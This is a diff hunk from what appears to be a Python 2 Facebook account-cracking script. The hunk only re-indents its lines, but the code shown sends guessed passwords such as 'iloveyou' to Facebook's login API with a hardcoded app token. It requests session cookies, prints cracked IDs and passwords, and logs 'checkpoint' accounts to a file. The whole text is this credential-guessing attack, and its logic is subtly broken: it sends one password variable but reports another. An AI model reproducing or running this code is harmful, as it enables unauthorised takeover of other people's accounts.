@@ -401,11 +401,11 @@ def pilih_super():
 											cek.write("ID:" +user+ " Pw:" +pass4+"\n")
 											cek.close()
 											cekpoint.append(user+pass4)
-                                                                 else:
-									 pass5 = 'iloveyou'
-									 data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-									 q = json.load(data)
-									 if 'access_token' in q:
+                                                                        else:
+									      pass5 = 'iloveyou'
+									      data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+									      q = json.load(data)
+									      if 'access_token' in q:
                                                                                 print '\x1b[33;1m \x1b[0;1mNama \x1b[1;91m      : \x1b[0;1m' + a['name']
 										print '\x1b[32;1m[Ok] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
 										print '\x1b[32;1m[✓] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass5 + '\n'
